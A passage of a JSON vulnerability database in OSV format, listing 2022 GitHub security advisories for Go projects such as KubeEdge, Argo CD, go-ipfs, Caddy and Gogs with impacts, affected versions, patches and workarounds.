"ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.7"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-wc5v-r48v-g4vh"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/commit/c758da7e9d19cd19b96dc90424c0b5ec7409cd0a"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-07-15T21:46:51Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wrcr-x4qj-j543", "modified": "2022-07-19T21:05:39Z", "published": "2022-07-11T21:05:32Z", "aliases": ["CVE-2022-31079"], "summary": "KubeEdge Cloud Stream and Edge Stream DoS from large stream message", "details": "### Impact\nThe Cloud Stream server and the Edge Stream server reads the entire message into memory without imposing a limit on the size of this message. An attacker can exploit this by sending a large message to exhaust memory and cause a DoS. The Cloud Stream server and the Edge Stream server are under DoS attack in this case. The consequence of the exhaustion is that the CloudCore and EdgeCore will be in a denial of service.\nOnly an authenticated user can cause this issue. It will be affected only when users enable cloudStream module in the config file cloudcore.yaml and enable edgeStream module in the config file edgecore.yaml as below.\ncloudcore.yaml:\n```\nmodules:\n  ...\n  cloudStream:\n    enable: true\n```\nedgecore.yaml:\n```\nmodules:\n  ...\n  edgeStream:\n    enable: true\n```\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4. Users should update to these versions to resolve the issue.\n\n### Workarounds\nDisable cloudStream module in the config file cloudcore.yaml and disable edgeStream module in the config file edgecore.yaml, restart process cloudcore and edgecore after modification.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-wrcr-x4qj-j543"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31079"}, {"type": "PACKAGE", "url": "https://github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-11T21:05:32Z", "nvd_published_at": "2022-07-11T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pmjg-52h9-72qv", "modified": "2022-07-21T15:54:45Z", "published": "2022-07-12T22:11:16Z", "aliases": ["CVE-2022-31102"], "summary": "Argo CD SSO users vulnerable to Cross-site Scripting", "details": "### Impact\n\nAll versions of Argo CD starting with 2.3.0 are vulnerable to a cross-site scripting (XSS) bug which could allow an attacker to inject arbitrary JavaScript in the `/auth/callback` page in a victim's browser. \n\nThis vulnerability only affects Argo CD instances which have SSO enabled.\n\nThe exploit also assumes the attacker has 1) access to the API server's encryption key, 2) a method to add a cookie to the victim's browser, and 3) the ability to convince the victim to visit a malicious `/auth/callback` link.\n\nThe vulnerability is classified as low severity, because access to the API server's encryption key already grants a high level of access. Exploiting the XSS would allow the attacker to impersonate the victim, but would not grant any privileges which the attacker could not otherwise gain using the encryption key.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.4.5\n* v2.3.6\n\n### Workarounds\n\nThere is no workaround besides upgrading.\n\n### Credits\n\nDisclosed by ADA Logics in a security audit of the Argo project sponsored by CNCF and facilitated by OSTIF. Thanks to Adam Korczynski and David Korczynski for their work on the audit.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-pmjg-52h9-72qv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31102"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/3800a1e49d1d5a00a6692fee83396a37a6abe89a"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/8d5119b1e3038a2c1d8b651cb242525e9e734c4c"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.3.6"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.4.5"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-07-12T22:11:16Z", "nvd_published_at": "2022-07-12T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f2gr-7299-487h", "modified": "2022-07-06T20:06:56Z", "published": "2022-07-06T20:06:56Z", "aliases": [], "summary": "DOS and excessive memory usage when passing untrusted user input to to dag import", "details": "### Impact\ngo-ipfs nodes crash when trying to import certain malformed CAR files due to an issue in the go-car dependency. This impacts nodes running `ipfs dag import` on untrusted user inputs, for example, pinning services with a car ingest endpoint.\nThis include the corresponding [HTTP RPC API `v0/dag/import`](https://docs.ipfs.io/reference/http/api/#api-v0-dag-import) endpoint.\n\nAn attacker controlling the car file passed in can also make the node allocate arbitrary sized buffers creating memory exhaustion attacks.\n\n### Patches\n0.13.1, 0.14 and later.\n\n#### Forks\nFor those running on forked versions of go-ipfs, simply updating the version of `github.com/ipld/go-car/v2` you are using to >= v2.4.0 should resolve the issue.\n\n#### Libraries consumers\nAny users of libraries within the go-ipfs ecosystem, even if not the go-ipfs package or binary itself, may be affected and should upgrade their dependency on go-car.\n\nYou can check if your Go module has a dependency on go-car by running a command such as `go mod graph | grep go-car`  in your module root.\n\nNote: if you are using other libraries, some parts of go-car (`github.com/ipld/go-car/v2/index/...`) have not fully been fixed yet.  Please see [go-car's security advisory](https://github.com/ipld/go-car/security/advisories/GHSA-9x4h-8wgm-8xfg) for more information.  go-ipfs do not make use of this code.\n\n### Workarounds\nThe best way to work around this is to control exposure to the [HTTP RPC API endpoint for CAR imports](https://docs.ipfs.io/reference/http/api/#api-v0-dag-import) to only work with trusted data.\n\nYou can also validate that the car will not crash go-ipfs by running `car verify` on it first (`go install github.com/ipld/go-car/cmd/car@latest`).\n\n### References\nSee also the [go-car security advisory](https://github.com/ipld/go-car/security/advisories/GHSA-9x4h-8wgm-8xfg).\n\n### For more information\nIf you have any questions or comments about this advisory:\n1. Ask in the [IPFS Discourse](discuss.ipfs.io/)\n1. Ask in the [IPFS Discord #ipld-chatter](https://discord.gg/ipfs)\n1. Open an issue in [go-ipfs](https://github.com/ipfs/go-ipfs)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-ipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.5.0"}, {"fixed": "0.13.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/security/advisories/GHSA-f2gr-7299-487h"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-ipfs"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-06T20:06:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m7gr-5w5g-36jf", "modified": "2022-07-29T13:06:38Z", "published": "2022-07-23T00:00:22Z", "aliases": ["CVE-2022-34037"], "summary": "Out-of-bounds Read can lead to client side denial of service", "details": "An out-of-bounds read in the rewrite function at /modules/caddyhttp/rewrite/rewrite.go in Caddy v2.5.1 allows attackers to cause a Denial of Service (DoS) on the client side via a crafted URI.\n\nAccording to the maintainer, the bug only affects the client side of the request and cannot cause a denial of service on the server.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/caddyserver/caddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-34037"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/issues/4775"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/commit/693e9b5283e675b56084ecc83d73176cab0ee27c"}, {"type": "PACKAGE", "url": "https://github.com/caddyserver/caddy"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-27T22:12:07Z", "nvd_published_at": "2022-07-22T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vwm6-qc77-v2rh", "modified": "2022-07-19T22:30:59Z", "published": "2022-07-11T21:00:20Z", "aliases": ["CVE-2022-31073"], "summary": "KubeEdge Edge ServiceBus module DoS", "details": "### Impact\nThe ServiceBus server on the edge side may be susceptible to a DoS attack if an HTTP request containing a very large Body is sent to it.\nIt is possible for the node to be exhausted of memory. The consequence of the exhaustion is that other services on the node, e.g. other containers, will be unable to allocate memory and thus causing a denial of service.\nMalicious Apps which by accident pulled by users on the host and have the access to send HTTP requests to localhost may make an attack. It will be affected only when users enable the `ServiceBus` module in the config file `edgecore.yaml` as below:\n```\nmodules:\n  ...\n  serviceBus:\n    enable: true\n```\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4. Users should update to these versions to resolve the issue.\n\n### Workarounds\nDisable the ServiceBus module in the config file `edgecore.yaml`.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-vwm6-qc77-v2rh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31073"}, {"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/pull/4038"}, {"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/pull/4039"}, {"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/pull/4042"}, {"type": "PACKAGE", "url": "github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-11T21:00:20Z", "nvd_published_at": "2022-07-11T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-477v-w82m-634j", "modified": "2023-08-29T17:58:25Z", "published": "2022-07-16T00:00:20Z", "aliases": ["CVE-2022-25891"], "summary": "Shoutrrr util package DoS via sending 2000, 4000, or 6000 character messages", "details": "The package `github.com/containrrr/shoutrrr/pkg/util` before 0.6.0 are vulnerable to Denial of Service (DoS) via the `util.PartitionMessage` function. Exploiting this vulnerability is possible by sending exactly 2000, 4000, or 6000 characters messages.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containrrr/shoutrrr"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25891"}, {"type": "WEB", "url": "https://github.com/containrrr/shoutrrr/issues/240"}, {"type": "WEB", "url": "https://github.com/containrrr/shoutrrr/pull/242"}, {"type": "WEB", "url": "https://github.com/containrrr/shoutrrr/commit/6a27056f9d7522a8b493216195cb7634bf4b5c42"}, {"type": "PACKAGE", "url": "https://github.com/containrrr/shoutrrr"}, {"type": "WEB", "url": "https://github.com/containrrr/shoutrrr/releases/tag/v0.6.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0528"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINRRRSHOUTRRRPKGUTIL-2849059"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-20T02:45:42Z", "nvd_published_at": "2022-07-15T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-72x4-cq6r-jp4p", "modified": "2023-10-02T11:31:35Z", "published": "2022-07-08T17:06:39Z", "aliases": ["CVE-2022-31121"], "summary": "Hyperledger Fabric vulnerable to Improper Input Validation in orderer/common/cluster consensus request", "details": "### Impact\nIf a consensus client sends a malformed consensus request to an orderer it may crash the orderer node.\nThis fix checks for the malformed consensus request and returns an error to the consensus client.\n\n### Specific Go Packages Affected\ngithub.com/hyperledger/fabric/orderer/common/cluster\n\n### Patches\nFixed in v2.2.7 and v2.4.5.\n\n### Workarounds\nNone, users must upgrade to v2.2.7 or v2.4.5.\n\n### References\nhttps://github.com/hyperledger/fabric/releases/tag/v2.2.7\nhttps://github.com/hyperledger/fabric/releases/tag/v2.4.5\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Hyperledger Fabric repository](https://github.com/hyperledger/fabric/issues)\n\n### Credits\nThank you to Haosheng Wang of OPPO ZIWU Security Lab for this disclosure.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.4.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hyperledger/fabric/security/advisories/GHSA-72x4-cq6r-jp4p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31121"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/commit/0f18359493bcbd5f9f9d1a9b05adabfe5da23b06"}, {"type": "PACKAGE", "url": "https://github.com/hyperledger/fabric"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/releases/tag/v2.2.7"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/releases/tag/v2.4.5"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-07-08T17:06:39Z", "nvd_published_at": "2022-07-07T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w52j-3457-q9wr", "modified": "2022-07-19T22:29:12Z", "published": "2022-07-11T21:01:31Z", "aliases": ["CVE-2022-31074"], "summary": "KubeEdge Cloud AdmissionController component DoS", "details": "### Impact\nSeveral endpoints including `/devicemodels`, `/rules`, `/ruleendpoints`, `/offlinemigration` in the Cloud Admissioncontroller may be susceptible to a DoS attack if an HTTP request containing a very large Body is sent to it.\nOnly an authenticated user can cause this issue. It will be affected when users deploy a Cloud Admissioncontroller. The consequence of the exhaustion is that the Cloud Admissioncontroller will be in denial of service.\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4. Users should update to these versions to resolve the issue.\n\n### Workarounds\nAt the time of writing, no workaround exists.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-w52j-3457-q9wr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31074"}, {"type": "PACKAGE", "url": "github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-11T21:01:31Z", "nvd_published_at": "2022-07-11T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x3px-2p95-f6jr", "modified": "2022-07-19T22:28:49Z", "published": "2022-07-11T21:04:04Z", "aliases": ["CVE-2022-31075"], "summary": "KubeEdge DoS when signing the CSR from EdgeCore", "details": "### Impact\nEdgeCore may be susceptible to a DoS attack on CloudHub if an attacker was to send a well-crafted HTTP request to `/edge.crt`.\nIf an attacker can send a well-crafted HTTP request to CloudHub, and that request has a very large body, that request could crash the HTTP service through a memory exhaustion vector. The request body is being read into memory, and a body that was larger than the available memory could lead to a successful attack.\nBecause the request would have to make it through authorization, only authorized users could perform this attack. The consequence of the exhaustion is that CloudHub will be in denial of service. It will be affected only when users enable the CloudHub module in the file `cloudcore.yaml` as below:\n```\nmodules:\n  ...\n  cloudHub:\n    enable: true\n```\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4. Users should update to these versions to resolve the issue.\n\n### Workarounds\nDisable the CloudHub module in the config file `cloudcore.yaml`.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-x3px-2p95-f6jr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31075"}, {"type": "PACKAGE", "url": "github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-11T21:04:04Z", "nvd_published_at": "2022-07-11T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qwrj-9hmp-gpxh", "modified": "2023-02-09T20:22:10Z", "published": "2022-07-15T18:10:48Z", "aliases": ["CVE-2022-31145"], "summary": "FlyteAdmin Insufficient AccessToken Expiration Check", "details": "### Impact\nAuthenticated users using an external identity provider can continue to use Access Tokens and ID Tokens even after they expire.\nUsing flyteadmin as the OAuth2 Authorization Server is unaffected by this issue.\n\n### Patches\n1.1.30\n\n### Workarounds\nRotating signing keys immediately will:\n* Invalidate all open sessions,\n* Force all users to attempt to obtain new tokens.\n\nContinue to rotate keys until flyteadmin has been upgraded,\n\nHide flyteadmin deployment ingress url from the internet.\n\n### References\nhttps://github.com/flyteorg/flyteadmin/pull/455\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [flyte repo](https://github.com/flyteorg/flyte/issues)\n* Email us at [flyte](mailto:admin@flyte.org)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flyteorg/flyteadmin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.31"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/security/advisories/GHSA-qwrj-9hmp-gpxh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31145"}, {"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/pull/455"}, {"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/commit/a1ec282d02706e074bc4986fd0412e5da3b9d00a"}, {"type": "PACKAGE", "url": "https://github.com/flyteorg/flyteadmin"}, {"type": "WEB", "url": "https://github.com/flyteorg/flyteadmin/releases/tag/v1.1.31"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0519"}], "database_specific": {"cwe_ids": ["CWE-298", "CWE-613"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-15T18:10:48Z", "nvd_published_at": "2022-07-13T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6wvc-6pww-qr4r", "modified": "2022-07-11T21:06:28Z", "published": "2022-07-11T21:06:28Z", "aliases": ["CVE-2022-31080"], "summary": "DoS in KubeEdge's Websocket Client in package Viaduct", "details": "### Impact\nA large response received by the viaduct WSClient can cause a DoS from memory exhaustion. The entire body of the response is being read into memory which could allow an attacker to send a request that returns a response with a large body.\nThe consequence of the exhaustion is that the process which invokes a WSClient will be in a denial of service. It will be affected If users which are authenticated to the edge side and connect from the edge side to `cloudhub` through WebSocket protocol.\n\n### Patches\nThis bug has been fixed in Kubeedge 1.11.1, 1.10.2, 1.9.4. Users should update to these versions to resolve the issue.\n\n### Workarounds\nAt the time of writing, no workaround exists.\n\n### References\nNA\n\n### Credits\nThanks David Korczynski and Adam Korczynski of ADA Logics for responsibly disclosing this issue in accordance with the [kubeedge security policy](https://github.com/kubeedge/kubeedge/security/policy) during a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [KubeEdge repo](https://github.com/kubeedge/kubeedge/issues/new/choose)\n* To make a vulnerability report, email your vulnerability to the private [cncf-kubeedge-security@lists.cncf.io](mailto:cncf-kubeedge-security@lists.cncf.io) list with the security details and the details expected for [KubeEdge bug reports](https://github.com/kubeedge/kubeedge/blob/master/.github/ISSUE_TEMPLATE/bug-report.md).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubeedge/kubeedge"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubeedge/kubeedge/security/advisories/GHSA-6wvc-6pww-qr4r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31080"}, {"type": "PACKAGE", "url": "github.com/kubeedge/kubeedge"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-07-11T21:06:28Z", "nvd_published_at": "2022-07-11T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6vcc-v9vw-g2x5", "modified": "2022-06-17T19:20:55Z", "published": "2022-06-08T22:34:23Z", "aliases": ["CVE-2022-1993"], "summary": "Path Traversal in Git HTTP endpoints in Gogs", "details": "### Impact\n\nThe malicious user is able to craft HTTP requests to access unauthorized Git directories. All installations with are affected.\n\n### Patches\n\nPath cleaning has accommodated for Git HTTP endpoints. Users should upgrade to 0.12.9 or the latest 0.13.0+dev.\n\n### Workarounds\n\nN/A\n\n### References\n\nhttps://huntr.dev/bounties/22f9c074-cf60-4c67-b5c4-72fdf312609d/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #7002.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-6vcc-v9vw-g2x5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1993"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/7002"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/9bf748b6c4c9a17d3aa77f6b9abcfae65451febf"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/22f9c074-cf60-4c67-b5c4-72fdf312609d"}, {"type": "WEB", "url": "https://huntr.dev/bounties/22f9c074-cf60-4c67-b5c4-72fdf312609d/"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-08T22:34:23Z", "nvd_published_at": "2022-06-09T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3jhm-87m6-x959", "modified": "2023-10-02T11:02:19Z", "published": "2022-06-25T07:12:08Z", "aliases": [], "summary": "Path traversal mitigation bypass in OctoRPKI", "details": "### Impact\nThe existing URI path filters in OctoRPKI (version < 